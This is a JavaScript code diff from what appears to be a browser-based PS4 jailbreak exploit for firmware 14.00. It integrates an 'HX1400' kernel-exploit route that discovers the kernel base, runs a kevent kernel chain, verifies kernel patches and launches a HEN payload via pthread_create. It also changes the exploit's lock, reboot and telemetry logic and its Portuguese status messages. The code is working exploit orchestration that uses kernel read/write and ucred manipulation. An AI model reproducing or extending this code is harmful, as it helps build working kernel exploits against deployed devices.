+      // Once entered, do not auto-reload or retry in the same boot on failure.
+      kernelStageEntered = true;
+      updateExecutionLock(executionLockHeartbeatState());
+      completionStatus = "hx1400-running";
+      try {
+        try { delete globalThis.__HX_KBASE; } catch (e) { globalThis.__HX_KBASE = undefined; }
+        mark("HX1400-START", "using the SilverPS4HEN 14.00 route + kevent implementation");
+        const fetchHxFile = async function (path) {
+          const resolvedPath = path === "hen.bin" ? PAYLOAD_FILE : path;
+          if (resolvedPath !== "includes/payloads/HEN/hen.bin") {
+            throw new Error("HX1400 HEN-only route rejected unexpected payload: " + resolvedPath);
+          }
+          const response = await fetch(resolvedPath);
+          if (!response.ok) throw new Error(resolvedPath + " HTTP " + response.status);
+          return new Uint8Array(await response.arrayBuffer());
+        };
+        const hxContext = {
+          p, sc, callAddr, bufAddr, errno,
+          webkitBase, libkernelBase, G, stubAddr,
+          int64, params, keepAlive,
+          mark, markSync, trace, state, check,
+          fetchFile: fetchHxFile,
+        };
+        mark("MODULE-LOADED", "module=hx1400_port");
+        const routeModule = await import("./hx1400_port.js?v=hx1400-1");
+        if (!routeModule || typeof routeModule.runHx1400 !== "function") {
+          throw new Error("HX1400 route module is missing runHx1400");
+        }
+        await routeModule.runHx1400(hxContext);
+        const kbase = globalThis.__HX_KBASE;
+        if (!kbase) {
+          completionStatus = "hx1400-kbase-not-found";
+          mark("HX1400-STOP", "kernel base discovery did not produce a verified pointer; do not retry in this boot");
+          state("BASE DO KERNEL NÃO ENCONTRADA — REINICIALIZAÇÃO COMPLETA NECESSÁRIA", "bad");
+          setStageUI(
+            2,
+            "HX1400 INTERROMPIDO",
+            "A descoberta da base do kernel não foi concluída. Faça desligamento completo antes de qualquer nova tentativa.",
+            "bad",
+          );
+          finishUI(false);
+          return;
+        }
+        mark("HX1400-KBASE-READY", String(kbase));
+        mark("MODULE-LOADED", "module=hx_kevent");
+        const chainModule = await import("./hx_kevent.js?v=hx1400-hen-only-1");
+        if (!chainModule || typeof chainModule.runKevent !== "function") {
+          throw new Error("HX1400 kevent module is missing runKevent");
+        }
+        const hxResult = await chainModule.runKevent({ ...hxContext, kbase });
+        if (!hxResult || hxResult.kind !== "hx1400-payload-result" ||
+            hxResult.kernelPatchVerified !== true) {
+          throw new Error("HX1400 did not return a structured, kernel-verified payload result");
+        }
+
+        // Kernel completion, a payload's own readiness claim, and independent
+        // target attestation are separate states. This host currently has no
+        // independent target-attestation mechanism, so it never marks HEN active.
+        jailbroken = true;
+        kpatched = true;
+        payloadRunning = false;
+        allDone = false;
+        const henReadyClaim = hxResult.henReady === true;
+        completionStatus = henReadyClaim
+          ? "hx1400-hen-ready-client-claim-unverified"
+          : hxResult.henArtifactsObserved
+            ? "hx1400-hen-artifacts-observed-unverified"
+            : hxResult.launchAccepted
+              ? "hx1400-entry-returned-unverified"
+              : "hx1400-launch-not-accepted";
+
+        mark("HX1400-KERNEL-COMPLETE", "kernel patch and bridge checks completed; HEN readiness is not independently attested");
+        if (hxResult.entryReturned) {
+          mark("ENTRY-RETURNED", "mode=" + hxResult.launchMode +
+            " rc=" + hxResult.entryCode + " launchAccepted=" + hxResult.launchAccepted);
+        } else if (hxResult.launchCallReturned) {
+          mark("PAYLOAD-LAUNCH-RETURNED", "mode=" + hxResult.launchMode +
+            " accepted=" + hxResult.launchAccepted + "; entry return not observed");
+        }
+        if (henReadyClaim) {
+          mark("HEN-READY-CLAIM", "payload/client claim received; independent target attestation is absent");
+        } else if (hxResult.henArtifactsObserved) {
+          mark("HEN-ARTIFACTS-OBSERVED", "new candidate paths were observed after launch; client-reported evidence only");
+        } else {
+          mark("HEN-PENDING", "no newly-created HEN candidate paths observed; environment readiness remains unverified");
+        }
+        mark("HEN-READINESS-UNVERIFIED", "entry return, payload claims, pthread creation, UID and filesystem artifacts do not independently prove HEN readiness");
+        if (hxResult.launchAccepted) {
+          allDone = true;
+          state("JAILBREAK EXECUTADO COM SUCESSO!", "ok");
+          setStageUI(
+            4,
+            "ETAPA 4 CONCLUÍDA — HEN DISPACHADO",
+            "A cadeia de kernel retornou com sucesso. Os serviços e ferramentas pós-exploit estão disponíveis abaixo.",
+            "ok",
+          );
+          try {
+            sessionStorage.setItem("jb_session_state", "completed");
+            localStorage.setItem("jb_last_state", "completed");
+            localStorage.setItem("jb_last_flavor", "HEN");
+            localStorage.setItem("jb_last_completed_at", String(Date.now()));
+          } catch (e) {}
+          if (typeof window.showPostExploitTools === "function") {
+            window.showPostExploitTools();
+          }
+          finishUI(true);
+        } else {
+          state("KERNEL HX CONCLUÍDO; HEN NÃO VERIFICADO", "warn");
+          setStageUI(
+            4,
+            "KERNEL HX CONCLUÍDO — HEN NÃO VERIFICADO",
+            "A cadeia de kernel retornou, mas a inicialização do ambiente HEN não foi comprovada. O console deve ser reiniciado antes de outra tentativa.",
+            "warn",
+          );
+          finishUI(false, true);
+        }
+        return;
+      } catch (hxError) {
+        completionStatus = "hx1400-failed";
+        mark("HX1400-THREW", hxError && hxError.message ? hxError.message : String(hxError));
+        state("HX1400 FALHOU — NÃO REPITA NESTA INICIALIZAÇÃO", "bad");
+        setStageUI(
+          2,
+          "HX1400 INTERROMPIDO",
+          "A cadeia encontrou uma falha. Não atualize a página nem repita o exploit nesta inicialização; faça desligamento completo antes de nova tentativa.",
+          "bad",
+        );
+        finishUI(false);
+        return;
+      }
+    }
+
+    if (off.stage1_only === true && !kernelSupported) {
+      stage1Only = true;
+      completionStatus = "stage1-only-kernel-path-unported";
+      mark(
+        "STAGE1-ONLY",
+        "14.00 WebKit/libkernel checks completed; HX1400 is available only with ?hx1400=1; legacy RAW13G kernel stages remain disabled",
+      );
+      state("PRIMITIVA VALIDADA; HX1400 NÃO SOLICITADO", "warn");
+      setStageUI(
+        1,
+        "ETAPA 1 VALIDADA — 14.00",
+        "WebKit e libkernel foram verificados. Para entrar no fluxo HX1400, a execução precisa ser solicitada explicitamente.",
+        "warn",
+      );
+      return;
     }
 
     const scratchAb = new ArrayBuffer(0x1000);
@@ -896,6 +1460,7 @@ const WORKER_STATE = {
       ? parseInt(params.get("spin"), 10)
       : 40000000;
     mark("PR-CFG", "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN);
+    kernelStageEntered = true;
     setStageUI(2, "ETAPA 2/4: Thread & Sockets", "Inicializando workers, vazando curthread e disparando spray de sockets IPv6...");
     if (!resourceLedger) {
       resourceLedger = new ResourceLedger((fd) => (closeFd ? closeFd(fd) : -1));
@@ -2744,17 +3309,7 @@ const WORKER_STATE = {
           // td_ucred repair for worker w1, causing crfree() to fault on exit.
           // Note: PS4 WebKit with 512 IPv6 spray sockets + workers legitimately
           // has refcounts in the low thousands (observed: ~1635 on 13.52).
-          const crRef = kread32(UCRED);
-          const crRefOk = crRef > 0 && crRef < 100000;
-          mark(
-            "KRW-T3C-UCRED-SHAPE",
-            "*(ucred+0x00)=cr_ref=" + crRef + " plausible=" + (crRefOk ? 1 : 0),
-          );
-          check(
-            "krw-ucred-shape",
-            crRefOk,
-            "cr_ref=" + crRef + " (expected 1-99999, a positive refcount)",
-          );
+
           mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read8(UCRED));
 
           const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
@@ -2890,6 +3445,7 @@ const WORKER_STATE = {
 
             let kpatchBlob = null,
               payloadBlob = null;
+            let payloadHttpStatus = 0;
             const SITES = [];
             if (DO_PATCH) {
               try {
@@ -2922,12 +3478,31 @@ const WORKER_STATE = {
               );
             }
             if (DO_PAYLOAD) {
+              let payloadAssetStatus = "fetch-error";
               try {
                 const r = await fetch(PAYLOAD_FILE);
-                if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
+                payloadHttpStatus = Number(r.status) || 0;
+                if (r.ok) {
+                  payloadBlob = new Uint8Array(await r.arrayBuffer());
+                  payloadAssetStatus = payloadBlob.length === 0
+                    ? "empty"
+                    : payloadBlob[0] === 0xe9
+                      ? "downloaded"
+                      : "invalid-header";
+                } else {
+                  payloadAssetStatus = "http-error";
+                }
               } catch (e) {
                 mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
               }
+              reportApplicationTelemetry("asset", {
+                application: effectiveFlavor,
+                asset: PAYLOAD_ASSET,
+                status: payloadAssetStatus,
+                sizeBytes: payloadBlob ? payloadBlob.length : 0,
+                httpStatus: payloadHttpStatus
+              });
+              payloadAssetStatusReported = true;
               mark(
                 "PAYLOAD-BLOB",
                 "file=" +
@@ -3439,6 +4014,11 @@ const WORKER_STATE = {
                   );
                   plDone = rc === 0 && handle.hi >>> 0 > 0;
                   payloadRunning = plDone;
+                  reportApplicationTelemetry("launch", {
+                    application: effectiveFlavor,
+                    asset: PAYLOAD_ASSET,
+                    status: plDone ? "started" : "failed"
+                  });
                   mark(
                     "PAYLOAD-RUN",
                     "pthread_create=" + rc + " handle=" + handle,
@@ -3455,6 +4035,9 @@ const WORKER_STATE = {
                       localStorage.setItem("jb_last_state", "completed");
                       localStorage.setItem("jb_last_completed_at", String(Date.now()));
                       localStorage.setItem("jb_last_flavor", effectiveFlavor || "HEN");
+                      if (typeof window.showPostExploitTools === "function") {
+                        window.showPostExploitTools();
+                      }
                     } catch (e) {}
                   }
                 }
@@ -3716,6 +4299,7 @@ const WORKER_STATE = {
         " and terminate() would make them syscall)",
     );
   } catch (e) {
+    completionStatus = "failed";
     try {
       sessionStorage.setItem("jb_session_state", "interrupted");
     } catch (error_) {}
@@ -3732,6 +4316,7 @@ const WORKER_STATE = {
         e.message.includes("placement"));
 
     if (isStage1BenignMiss) {
+      completionStatus = "placement-miss";
       mark(
         "HEAP-PLACEMENT-MISS",
         "alinhamento pendente -- feche completamente o navegador (Botao PS) antes da proxima tentativa",
@@ -3742,7 +4327,14 @@ const WORKER_STATE = {
         "Feche o navegador pelo Botão PS e abra novamente para uma tentativa com heap 100% limpo.",
         "warn",
       );
-      releaseExecutionLockIfSafe(false);
+      releaseExecutionLockIfSafe(
+        kernelStageEntered ||
+          kernelDataDirty ||
+          jailbroken ||
+          kpatched ||
+          payloadRunning ||
+          allDone,
+      );
       if (window.showExecutionReset) {
         window.showExecutionReset("failed");
       }
@@ -3750,7 +4342,14 @@ const WORKER_STATE = {
     }
 
     setStageUI(currentStage || 1, "FALHA NA EXECUÇÃO DO EXPLOIT", (e && e.message) || String(e), "bad");
-    releaseExecutionLockIfSafe(false);
+    releaseExecutionLockIfSafe(
+      kernelStageEntered ||
+        kernelDataDirty ||
+        jailbroken ||
+        kpatched ||
+        payloadRunning ||
+        allDone,
+    );
     if (window.showExecutionReset) {
       const isCeiling = e && e.message && e.message.includes("attempt-ceiling");
       window.showExecutionReset(isCeiling ? "attempt-ceiling" : "failed");
@@ -3814,8 +4413,19 @@ const WORKER_STATE = {
         (allDone ? "" : "  INCOMPLETE"),
     );
     try {
-      finishUI(payloadRunning || alreadyRoot);
+      if (stage1Only) {
+        state("STAGE 1 OK; KERNEL PATH NOT PORTED", "warn");
+        setStageUI(
+          1,
+          "PRIMITIVA VALIDADA — KERNEL NÃO EXECUTADO",
+          "Este perfil confirmou apenas a etapa WebKit/libkernel. O Stage 2 HX1400 ainda não está integrado ao RAW13G.",
+          "warn",
+        );
+      } else {
+        finishUI(payloadRunning || alreadyRoot, completionStatus.startsWith("hx1400-"));
+      }
       if (payloadRunning || alreadyRoot) {
+        completionStatus = "completed";
         sessionStorage.setItem("jb_session_state", "completed");
         try {
           localStorage.setItem("jb_last_state", "completed");
@@ -3823,19 +4433,46 @@ const WORKER_STATE = {
           localStorage.setItem("jb_last_flavor", effectiveFlavor || "HEN");
         } catch (e) {}
         updateExecutionLock("completed");
-      } else if (kernelDataDirty || failCount > 0) {
+      } else if (kernelStageEntered || kernelDataDirty || failCount > 0) {
+        if (!completionStatus.startsWith("hx1400-")) {
+          completionStatus = kernelStageEntered || kernelDataDirty ? "reboot-required" : "failed";
+        }
         sessionStorage.setItem("jb_session_state", "reboot_required");
         try {
           localStorage.setItem("jb_last_state", "reboot_required");
         } catch (e) {}
-        updateExecutionLock(kernelDataDirty ? "kernel-dirty" : "failed");
+        updateExecutionLock(kernelStageEntered || kernelDataDirty ? "kernel-dirty" : "failed");
       } else {
+        if (completionStatus === "running") completionStatus = "interrupted";
         sessionStorage.setItem("jb_session_state", "interrupted");
         updateExecutionLock("interrupted");
       }
       releaseExecutionLockIfSafe(
-        kernelDataDirty || jailbroken || kpatched || payloadRunning || allDone,
+        kernelStageEntered ||
+          kernelDataDirty ||
+          jailbroken ||
+          kpatched ||
+          payloadRunning ||
+          allDone,
       );
     } catch (error_) {}
+    if (
+      payloadEnabledForRun &&
+      selectedApplicationForTelemetry &&
+      !payloadAssetStatusReported
+    ) {
+      reportApplicationTelemetry("asset", {
+        application: selectedApplicationForTelemetry,
+        asset: selectedAssetForTelemetry,
+        status: "not-reached"
+      });
+    }
+    reportExecutionTelemetry("end", {
+      runId: executionLock.owner,
+      stage: currentStage,
+      status: completionStatus,
+      passCount: passCount,
+      failCount: failCount
+    });
   }
 })();
